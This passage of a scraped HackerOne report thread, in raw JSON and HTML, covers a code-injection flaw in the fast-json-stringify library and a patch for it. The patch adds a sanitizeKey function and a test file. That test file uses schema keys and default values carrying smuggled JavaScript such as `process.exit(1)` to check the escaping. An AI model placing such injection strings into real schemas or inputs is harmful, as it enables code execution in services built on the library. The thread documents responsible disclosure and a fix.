class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// no effects, valid output\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;asd\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe \u003cem\u003ebugged\u003c/em\u003e version protects against escaping strings delimited by \u003ccode\u003e\u0026#39;\u003c/code\u003e but produces illegal output.\u003cbr\u003e\nthe \u003cem\u003efixed\u003c/em\u003e version produces valid JSON because it\u0026#39;s not changing the input, but can be exploited to escape strings delimited by \u003ccode\u003e\u0026#39;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003ei see two potential solutions:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003edon\u0026#39;t escape \u003ccode\u003e\u0026#39;\u003c/code\u003e and build only strings delimited by \u003ccode\u003e\u0026quot;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003euse a \u003ccode\u003efunction\u003c/code\u003e to replace the backslashes to provide a powerful replace, eg:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitizeKey\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"sr\"\u003e*\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003evoid\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eHIC SUNT LEONES\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// eslint-disable-line\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-05-07T10:38:02.013Z","updated_at":"2019-05-07T10:38:02.013Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4806964,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-10T09:17:04.607Z","updated_at":"2019-05-10T09:17:04.607Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4834270,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"1. I think we would have the exact problem with `\"`, so this is not feasible.\n2. would you mind providing such a function?","markdown_message":"\u003col\u003e\n\u003cli\u003eI think we would have the exact problem with \u003ccode\u003e\u0026quot;\u003c/code\u003e, so this is not feasible.\u003c/li\u003e\n\u003cli\u003ewould you mind providing such a function?\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2019-05-14T08:51:03.252Z","updated_at":"2019-05-14T08:51:03.252Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4834385,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I do not see how to produce correct output and at the same time pass:\n\n```\nconst stringify3 = build({\n  title: 'Example Schema',\n  type: 'object',\n  properties: {\n    \"\\\"phra\\\\'\u0026\u0026(console.log(42))//||'phra\": {}\n  }\n})\n\n// this verifies the escaping\nJSON.parse(stringify3({\n  '\"phra\\'\u0026\u0026(console.log(42))//||\\'phra': 42\n}))\n```","markdown_message":"\u003cp\u003eI do not see how to produce correct output and at the same time pass:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst stringify3 = build({\n  title: \u0026#39;Example Schema\u0026#39;,\n  type: \u0026#39;object\u0026#39;,\n  properties: {\n    \u0026quot;\\\u0026quot;phra\\\\\u0026#39;\u0026amp;\u0026amp;(console.log(42))//||\u0026#39;phra\u0026quot;: {}\n  }\n})\n\n// this verifies the escaping\nJSON.parse(stringify3({\n  \u0026#39;\u0026quot;phra\\\u0026#39;\u0026amp;\u0026amp;(console.log(42))//||\\\u0026#39;phra\u0026#39;: 42\n}))\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-05-14T08:56:30.419Z","updated_at":"2019-05-14T08:56:30.419Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4834890,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is the latest patch, it fixes the last problem:\n\n\n```\ndiff --git a/index.js b/index.js\nindex b6bbe4f..f5ce493 100644\n--- a/index.js\n+++ b/index.js\n@@ -2,6 +2,7 @@\n \n var Ajv = require('ajv')\n var merge = require('deepmerge')\n+var util = require('util')\n \n // This Ajv instance is used to validate that the passed schema\n // is valid json schema. We reuse the instance to avoid having to\n@@ -301,7 +302,7 @@ function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n-        if (/${regex}/.test(keys[i])) {\n+        if (/${regex.replace(/\\\\*\\//g, '\\\\/')}/.test(keys[i])) {\n     `\n     if (type === 'object') {\n       code += buildObject(pp[regex], '', 'buildObjectPP' + index, externalSchema, fullSchema)\n@@ -484,13 +485,27 @@ function refFinder (ref, schema, externalSchema) {\n       return idFinder(schema, `#${ref[1]}`)\n     } else {\n       for (var i = 1; i \u003c walk.length; i++) {\n-        code += `['${walk[i]}']`\n+        code += `['${sanitizeKey(walk[i])}']`\n       }\n     }\n   }\n   return (new Function('schema', code))(schema)\n }\n \n+function sanitizeKey (key) {\n+  const rep = key.replace(/(\\\\*)'/g, function (match, p1) {\n+    var base = ''\n+    if (p1.length % 2 === 1) {\n+      base = p1.slice(2)\n+    } else {\n+      base = p1\n+    }\n+    var rep = base + '\\\\\\''\n+    return rep\n+  })\n+  return rep\n+}\n+\n function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u003e {\n     if (schema.properties[key]['$ref']) {\n@@ -502,12 +517,14 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key).replace(/\\\\/g, '\\\\\\\\'))\n \n     if (nullable) {\n       code += `\n-        if (obj['${key}'] === null) {\n+        if (obj['${sanitized}'] === null) {\n           ${addComma}\n-          json += '${$asString(key)}:null'\n+          json += '${asString}:null'\n           var rendered = true\n         } else {\n       `\n@@ -515,10 +532,10 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     if (type === 'number') {\n       code += `\n-          var t = Number(obj['${key}'])\n+          var t = Number(obj['${sanitized}'])\n           if (!isNaN(t)) {\n             ${addComma}\n-            json += '${$asString(key)}:' + t\n+            json += '${asString}:' + t\n       `\n     } else if (type === 'integer') {\n       code += `\n@@ -526,25 +543,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n-            if (isLong(obj['${key}'])) {\n+            if (isLong(obj['${sanitized}'])) {\n               ${addComma}\n-              json += '${$asString(key)}:' + obj['${key}'].toString()\n+              json += '${asString}:' + obj['${sanitized}'].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj['${key}'])\n+              var t = Number(obj['${sanitized}'])\n               if (!isNaN(t)) {\n                 ${addComma}\n-                json += '${$asString(key)}:' + t\n+                json += '${asString}:' + t\n                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n-            var t = Number(obj['${key}'])\n+            var t = Number(obj['${sanitized}'])\n             if (!isNaN(t)) {\n               ${addComma}\n-              json += '${$asString(key)}:' + t\n+              json += '${asString}:' + t\n               rendered = true\n             }\n         `\n@@ -554,9 +571,9 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n-        if (obj['${key}'] !== undefined) {\n+        if (obj['${sanitized}'] !== undefined) {\n           ${addComma}\n-          json += '${$asString(key)}:'\n+          json += '${asString}:'\n         `\n \n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n@@ -569,12 +586,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n-        json += '${$asString(key)}:${JSON.stringify(defaultValue).replace(/'/g, '\\'')}'\n+        json += '${asString}:${sanitizeKey(JSON.stringify(defaultValue).replace(/\\\\/g, '\\\\\\\\'))}'\n       `\n     } else if (schema.required \u0026\u0026 schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error('${key} is required!')\n+        throw new Error('${sanitized} is required!')\n       `\n     }\n \n@@ -637,7 +654,7 @@ function addIfThenElse (schema, name, externalSchema, fullSchema) {\n   var merged = merge(copy, then)\n \n   code += `\n-    valid = ajv.validate(${require('util').inspect(i, { depth: null })}, obj)\n+    valid = ajv.validate(${util.inspect(i, { depth: null })}, obj)\n     if (valid) {\n   `\n   if (merged.if \u0026\u0026 merged.then) {\n@@ -835,6 +852,8 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var code = ''\n   var funcName\n \n+  subKey = subKey || ''\n+\n   if (schema.type === undefined) {\n     var inferedType = inferTypeByKeyword(schema)\n     if (inferedType) {\n@@ -845,7 +864,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n \n-  var accessor = key.indexOf('[') === 0 ? key : `['${key}']`\n+  var accessor = key.indexOf('[') === 0 ? sanitizeKey(key) : `['${sanitizeKey(key)}']`\n   switch (type) {\n     case 'null':\n       code += `\n@@ -881,7 +900,7 @@ function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n     case undefined:\n       if ('anyOf' in schema) {\n         schema.anyOf.forEach((s, index) =\u003e {\n-          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== undefined ? subKey : 'i' + index)\n+          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== '' ? subKey : 'i' + index)\n           code += `\n             ${index === 0 ? 'if' : 'else if'}(ajv.validate(${require('util').inspect(s, { depth: null })}, obj${accessor}))\n               ${nestedResult.code}\ndiff --git a/test/anyof.test.js b/test/anyof.test.js\nindex afad34d..81ebdb9 100644\n--- a/test/anyof.test.js\n+++ b/test/anyof.test.js\n@@ -1,6 +1,6 @@\n 'use strict'\n \n-const test = require('tap').test\n+const { test } = require('tap')\n const build = require('..')\n \n test('object with multiple types field', (t) =\u003e {\ndiff --git a/test/sanitize.test.js b/test/sanitize.test.js\nnew file mode 100644\nindex 0000000..15cc039\n--- /dev/null\n+++ b/test/sanitize.test.js\n@@ -0,0 +1,142 @@\n+'use strict'\n+\n+const t = require('tap')\n+const build = require('..')\n+\n+const stringify = build({\n+  title: 'Example Schema',\n+  type: 'object',\n+  properties: {\n+    firstName: {\n+      type: 'string'\n+    },\n+    lastName: {\n+      type: 'string'\n+    },\n+    age: {\n+      description: 'Age in years\"',\n+      type: 'integer'\n+    },\n+    [(() =\u003e `phra'\u0026\u0026 process.exit(1) ||'phra`)()]: {},\n+    now: {\n+      type: 'string'\n+    },\n+    reg: {\n+      type: 'string',\n+      default: 'a\\'\u0026\u0026 process.exit(1) ||\\''\n+    },\n+    obj: {\n+      type: 'object',\n+      properties: {\n+        bool: {\n+          type: 'boolean'\n+        }\n+      }\n+    },\n+    '\"\\'w00t': {\n+      type: 'string',\n+      default: '\"\\'w00t'\n+    },\n+    arr: {\n+      type: 'array',\n+      items: {\n+        type: 'object',\n+        properties: {\n+          'phra\\' \u0026\u0026 process.exit(1)//': {\n+            type: 'number'\n+          },\n+          str: {\n+            type: 'string'\n+          }\n+        }\n+      }\n+    }\n+  },\n+  required: ['now'],\n+  patternProperties: {\n+    '.*foo$': {\n+      type: 'string'\n+    },\n+    'test': {\n+      type: 'number'\n+    },\n+    'phra\\'/ \u0026\u0026 process.exit(1) \u0026\u0026 /\\'': {\n+      type: 'number'\n+    },\n+    '\"\\'w00t.*////': {\n+      type: 'number'\n+    }\n+  },\n+  additionalProperties: {\n+    type: 'string'\n+  }\n+})\n+\n+const obj = {\n+  firstName: 'Matteo',\n+  lastName: 'Collina',\n+  age: 32,\n+  now: new Date(),\n+  foo: 'hello\"',\n+  bar: \"world'\",\n+  'fuzz\"': 42,\n+  \"me'\": 42,\n+  numfoo: 42,\n+  test: 42,\n+  strtest: '23',\n+  arr: [{ 'phra\\' \u0026\u0026 process.exit(1)//': 42 }],\n+  obj: { bool: true },\n+  notmatch: 'valar morghulis',\n+  notmatchobj: { a: true },\n+  notmatchnum: 42\n+}\n+\n+// pass if it does not crash\n+const json = stringify(obj)\n+JSON.parse(json)\n+\n+const stringify2 = build({\n+  title: 'Example Schema',\n+  type: 'object',\n+  patternProperties: {\n+    '\"\\'w00t.*////': {\n+      type: 'number'\n+    }\n+  }\n+})\n+\n+t.deepEqual(JSON.parse(stringify2({\n+  '\"\\'phra////': 42,\n+  'asd': 42\n+})), {\n+})\n+\n+const stringify3 = build({\n+  title: 'Example Schema',\n+  type: 'object',\n+  properties: {\n+    \"\\\"phra\\\\'\u0026\u0026(console.log(42))//||'phra\": {}\n+  }\n+})\n+\n+// this verifies the escaping\n+JSON.parse(stringify3({\n+  '\"phra\\'\u0026\u0026(console.log(42))//||\\'phra': 42\n+}))\n+\n+const stringify4 = build({\n+  title: 'Example Schema',\n+  type: 'object',\n+  properties: {\n+    '\"\\\\\\\\\\\\\\\\\\'w00t': {\n+      type: 'string',\n+      default: '\"\\'w00t'\n+    }\n+  }\n+})\n+\n+t.deepEqual(JSON.parse(stringify4({})), {\n+  '\"\\\\\\\\\\\\\\\\\\'w00t': '\"\\'w00t'\n+})\n+\n+t.pass('no crashes')\n```","markdown_message":"\u003cp\u003eHere is the latest patch, it fixes the last problem:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/index.js b/index.js\nindex b6bbe4f..f5ce493 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/index.js\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/index.js\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -2,6 +2,7 @@\u003c/span\u003e\n\n var Ajv = require(\u0026#39;ajv\u0026#39;)\n var merge = require(\u0026#39;deepmerge\u0026#39;)\n\u003cspan class=\"gi\"\u003e+var util = require(\u0026#39;util\u0026#39;)\n\u003c/span\u003e\n // This Ajv instance is used to validate that the passed schema\n // is valid json schema. We reuse the instance to avoid having to\n\u003cspan class=\"p\"\u003e@@ -301,7 +302,7 @@\u003c/span\u003e function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n\u003cspan class=\"gd\"\u003e-        if (/${regex}/.test(keys[i])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (/${regex.replace(/\\\\*\\//g, \u0026#39;\\\\/\u0026#39;)}/.test(keys[i])) {\n\u003c/span\u003e     `\n     if (type === \u0026#39;object\u0026#39;) {\n       code += buildObject(pp[regex], \u0026#39;\u0026#39;, \u0026#39;buildObjectPP\u0026#39; + index, externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -484,13 +485,27 @@\u003c/span\u003e function refFinder (ref, schema, externalSchema) {\n       return idFinder(schema, `#${ref[1]}`)\n     } else {\n       for (var i = 1; i \u0026lt; walk.length; i++) {\n\u003cspan class=\"gd\"\u003e-        code += `[\u0026#39;${walk[i]}\u0026#39;]`\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        code += `[\u0026#39;${sanitizeKey(walk[i])}\u0026#39;]`\n\u003c/span\u003e       }\n     }\n   }\n   return (new Function(\u0026#39;schema\u0026#39;, code))(schema)\n }\n\n+function sanitizeKey (key) {\n\u003cspan class=\"gi\"\u003e+  const rep = key.replace(/(\\\\*)\u0026#39;/g, function (match, p1) {\n+    var base = \u0026#39;\u0026#39;\n+    if (p1.length % 2 === 1) {\n+      base = p1.slice(2)\n+    } else {\n+      base = p1\n+    }\n+    var rep = base + \u0026#39;\\\\\\\u0026#39;\u0026#39;\n+    return rep\n+  })\n+  return rep\n+}\n+\n\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u0026gt; {\n     if (schema.properties[key][\u0026#39;$ref\u0026#39;]) {\n\u003cspan class=\"p\"\u003e@@ -502,12 +517,14 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n\u003cspan class=\"gi\"\u003e+    var sanitized = sanitizeKey(key)\n+    var asString = sanitizeKey($asString(key).replace(/\\\\/g, \u0026#39;\\\\\\\\\u0026#39;))\n\u003c/span\u003e\n     if (nullable) {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] === null) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] === null) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:null\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:null\u0026#39;\n\u003c/span\u003e           var rendered = true\n         } else {\n       `\n\u003cspan class=\"p\"\u003e@@ -515,10 +532,10 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n\n     if (type === \u0026#39;number\u0026#39;) {\n       code += `\n\u003cspan class=\"gd\"\u003e-          var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e           if (!isNaN(t)) {\n             ${addComma}\n\u003cspan class=\"gd\"\u003e-            json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e       `\n     } else if (type === \u0026#39;integer\u0026#39;) {\n       code += `\n\u003cspan class=\"p\"\u003e@@ -526,25 +543,25 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n\u003cspan class=\"gd\"\u003e-            if (isLong(obj[\u0026#39;${key}\u0026#39;])) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            if (isLong(obj[\u0026#39;${sanitized}\u0026#39;])) {\n\u003c/span\u003e               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + obj[\u0026#39;${key}\u0026#39;].toString()\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + obj[\u0026#39;${sanitized}\u0026#39;].toString()\n\u003c/span\u003e               rendered = true\n             } else {\n\u003cspan class=\"gd\"\u003e-              var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e               if (!isNaN(t)) {\n                 ${addComma}\n\u003cspan class=\"gd\"\u003e-                json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+                json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n\u003cspan class=\"gd\"\u003e-            var t = Number(obj[\u0026#39;${key}\u0026#39;])\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            var t = Number(obj[\u0026#39;${sanitized}\u0026#39;])\n\u003c/span\u003e             if (!isNaN(t)) {\n               ${addComma}\n\u003cspan class=\"gd\"\u003e-              json += \u0026#39;${$asString(key)}:\u0026#39; + t\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+              json += \u0026#39;${asString}:\u0026#39; + t\n\u003c/span\u003e               rendered = true\n             }\n         `\n\u003cspan class=\"p\"\u003e@@ -554,9 +571,9 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n\u003cspan class=\"gd\"\u003e-        if (obj[\u0026#39;${key}\u0026#39;] !== undefined) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        if (obj[\u0026#39;${sanitized}\u0026#39;] !== undefined) {\n\u003c/span\u003e           ${addComma}\n\u003cspan class=\"gd\"\u003e-          json += \u0026#39;${$asString(key)}:\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          json += \u0026#39;${asString}:\u0026#39;\n\u003c/span\u003e         `\n\n       var result = nested(laterCode, name, key, schema.properties[key], externalSchema, fullSchema)\n\u003cspan class=\"p\"\u003e@@ -569,12 +586,12 @@\u003c/span\u003e function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n\u003cspan class=\"gd\"\u003e-        json += \u0026#39;${$asString(key)}:${JSON.stringify(defaultValue).replace(/\u0026#39;/g, \u0026#39;\\\u0026#39;\u0026#39;)}\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        json += \u0026#39;${asString}:${sanitizeKey(JSON.stringify(defaultValue).replace(/\\\\/g, \u0026#39;\\\\\\\\\u0026#39;))}\u0026#39;\n\u003c/span\u003e       `\n     } else if (schema.required \u0026amp;\u0026amp; schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n\u003cspan class=\"gd\"\u003e-        throw new Error(\u0026#39;${key} is required!\u0026#39;)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        throw new Error(\u0026#39;${sanitized} is required!\u0026#39;)\n\u003c/span\u003e       `\n     }\n\n@@ -637,7 +654,7 @@ function addIfThenElse (schema, name, externalSchema, fullSchema) {\n   var merged = merge(copy, then)\n\n   code += `\n\u003cspan class=\"gd\"\u003e-    valid = ajv.validate(${require(\u0026#39;util\u0026#39;).inspect(i, { depth: null })}, obj)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    valid = ajv.validate(${util.inspect(i, { depth: null })}, obj)\n\u003c/span\u003e     if (valid) {\n   `\n   if (merged.if \u0026amp;\u0026amp; merged.then) {\n\u003cspan class=\"p\"\u003e@@ -835,6 +852,8 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var code = \u0026#39;\u0026#39;\n   var funcName\n\n+  subKey = subKey || \u0026#39;\u0026#39;\n\u003cspan class=\"gi\"\u003e+\n\u003c/span\u003e   if (schema.type === undefined) {\n     var inferedType = inferTypeByKeyword(schema)\n     if (inferedType) {\n\u003cspan class=\"p\"\u003e@@ -845,7 +864,7 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n   var type = schema.type\n   var nullable = schema.nullable === true\n\n-  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? key : `[\u0026#39;${key}\u0026#39;]`\n\u003cspan class=\"gi\"\u003e+  var accessor = key.indexOf(\u0026#39;[\u0026#39;) === 0 ? sanitizeKey(key) : `[\u0026#39;${sanitizeKey(key)}\u0026#39;]`\n\u003c/span\u003e   switch (type) {\n     case \u0026#39;null\u0026#39;:\n       code += `\n\u003cspan class=\"p\"\u003e@@ -881,7 +900,7 @@\u003c/span\u003e function nested (laterCode, name, key, schema, externalSchema, fullSchema, subKe\n     case undefined:\n       if (\u0026#39;anyOf\u0026#39; in schema) {\n         schema.anyOf.forEach((s, index) =\u0026gt; {\n\u003cspan class=\"gd\"\u003e-          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== undefined ? subKey : \u0026#39;i\u0026#39; + index)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          var nestedResult = nested(laterCode, name, key, s, externalSchema, fullSchema, subKey !== \u0026#39;\u0026#39; ? subKey : \u0026#39;i\u0026#39; + index)\n\u003c/span\u003e           code += `\n             ${index === 0 ? \u0026#39;if\u0026#39; : \u0026#39;else if\u0026#39;}(ajv.validate(${require(\u0026#39;util\u0026#39;).inspect(s, { depth: null })}, obj${accessor}))\n               ${nestedResult.code}\n\u003cspan class=\"gh\"\u003ediff --git a/test/anyof.test.js b/test/anyof.test.js\nindex afad34d..81ebdb9 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/test/anyof.test.js\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/test/anyof.test.js\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1,6 +1,6 @@\u003c/span\u003e\n \u0026#39;use strict\u0026#39;\n\n-const test = require(\u0026#39;tap\u0026#39;).test\n\u003cspan class=\"gi\"\u003e+const { test } = require(\u0026#39;tap\u0026#39;)\n\u003c/span\u003e const build = require(\u0026#39;..\u0026#39;)\n\n test(\u0026#39;object with multiple types field\u0026#39;, (t) =\u0026gt; {\n\u003cspan class=\"gh\"\u003ediff --git a/test/sanitize.test.js b/test/sanitize.test.js\n\u003c/span\u003e\u003cspan class=\"p\"\u003enew file mode 100644\n\u003c/span\u003e\u003cspan class=\"gh\"\u003eindex 0000000..15cc039\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- /dev/null\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/test/sanitize.test.js\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -0,0 +1,142 @@\u003c/span\u003e\n\u003cspan class=\"gi\"\u003e+\u0026#39;use strict\u0026#39;\n+\n+const t = require(\u0026#39;tap\u0026#39;)\n+const build = require(\u0026#39;..\u0026#39;)\n+\n+const stringify = build({\n+  title: \u0026#39;Example Schema\u0026#39;,\n+  type: \u0026#39;object\u0026#39;,\n+  properties: {\n+    firstName: {\n+      type: \u0026#39;string\u0026#39;\n+    },\n+    lastName: {\n+      type: \u0026#39;string\u0026#39;\n+    },\n+    age: {\n+      description: \u0026#39;Age in years\u0026quot;\u0026#39;,\n+      type: \u0026#39;integer\u0026#39;\n+    },\n+    [(() =\u0026gt; `phra\u0026#39;\u0026amp;\u0026amp; process.exit(1) ||\u0026#39;phra`)()]: {},\n+    now: {\n+      type: \u0026#39;string\u0026#39;\n+    },\n+    reg: {\n+      type: 